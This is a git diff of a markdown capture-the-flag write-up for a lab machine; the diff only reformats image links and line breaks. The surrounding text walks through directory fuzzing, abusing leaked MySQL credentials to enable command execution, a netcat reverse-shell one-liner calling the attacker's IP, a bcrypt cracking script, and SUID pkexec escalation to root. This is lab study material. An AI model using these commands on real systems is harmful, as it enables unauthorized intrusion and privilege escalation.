@@ -84,7 +84,7 @@ Running: Linux 4.X
 OS CPE: cpe:/o:linux:linux_kernel:4.15
 OS details: Linux 4.15
 ```
-Fuzzing in port 80 I got:
+Fuzzing in port 80 I got:<br/>
 ```bash
 ffuf -u http://10.10.247.138/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -e .php,.txt,.bak,.zip
 
@@ -93,16 +93,16 @@ hidden                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration:
 whatever                [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 240ms]
 ```
 
-`/instructions.txt`
-![[lunizz1.png]]
+`/instructions.txt` <br/>
+![](Assets/lunizz1.png)<br/>
 
-`/hidden`
-![[lunizz3.png]]
+`/hidden` <br/>
+![](Assets/lunizz3.png)<br/>
 
-`/whatever`
-![[lunizz2.png]]
+`/whatever`<br/>
+![](Assets/lunizz2.png)
 
-Using the credentials found in instructions.txt I logged in to mysql and look for the databases and tables. In runornot database I found runcheck table with column run. I replace the value 0 with 1.
+Using the credentials found in instructions.txt I logged in to mysql and look for the databases and tables. In runornot database I found runcheck table with column run. I replace the value 0 with 1.<br/>
 ```bash 
 mysql -u runcheck -h 10.10.247.138 -P 3306 -p --skip-ssl
 Enter password: 
@@ -157,20 +157,21 @@ MySQL [runornot]> select * from runcheck;
 1 row in set (0.253 sec)
 ```
 
-Then it allowed me to execute commands in `/whatever` 
-![[lunizz4.png]]
+Then it allowed me to execute commands in `/whatever`  <br/>
+![](Assets/lunizz4.png)<br/>
 
-Using the following command I got the reverse shell 
+Using the following command I got the reverse shell <br/>
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.17.17.146 4444 >/tmp/f
 ```
-![[lunizz5.png]]
+![](Assets/lunizz5.png)<br/>
 
-In root directory I have found an interesting folder
-![[lunizz6.png]]
-Inside that folder I discovered a password hash 
-![[lunizz7.png]]
-So the password is encrypted according to the given code. I have used the following decryption code to decrypt the hash.
+In root directory I have found an interesting folder<br/>
+![](Assets/lunizz6.png) <br/>
+Inside that folder I discovered a password hash  <br/>
+![](Assets/lunizz7.png) <br/>
+So the password is encrypted according to the given code. I have used the following decryption code to decrypt the hash. <br/>
+
 ```python3
   GNU nano 8.4                                                                   hash_decrypt.py                                                                             
 import bcrypt
@@ -195,17 +196,17 @@ except FileNotFoundError:
     print("rockyou.txt file not found. Please verify its path.")
 ```
 
-And obtained the password. 
-![[lunizz8.png]]
-Inside adam's Desktop I have found this 
-![[lunizz9.png]]
+And obtained the password. <br/>
+![](Assets/lunizz8.png) <br/>
+Inside adam's Desktop I have found this <br/>
+![](Assets/lunizz9.png)<br/>
 `https://www.google.com/maps/@68.5090469,27.481808,3a,75y,313.8h,103.6t/data=!3m6!1e1!3m4!1skJPO1zlKRtMAAAQZLDcQIQ!3e2!7i10000!8i5000`
-Following the link I found 
-![[lunizz10.png]]
-Using reverse image search I found the location `northern lights`
-![[lunizz11.png]]
-Using password `northernlights` I logged in as mason. 
-Then I searched for suid binaries. 
-![[lunizz12.png]]
-suid bit was set to pkexec. Using it I got the root. 
-![[lunizz13.png]]
+Following the link I found <br/>
+![](Assets/lunizz10.png)<br/>
+Using reverse image search I found the location `northern lights` <br/>
+![](Assets/lunizz11.png)<br/>
+Using password `northernlights` I logged in as mason. <br/>
+Then I searched for suid binaries. <br/>
+![](Assets/lunizz12.png)<br/>
+suid bit was set to pkexec. Using it I got the root. <br/>
+![](Assets/lunizz13.png)<br/>
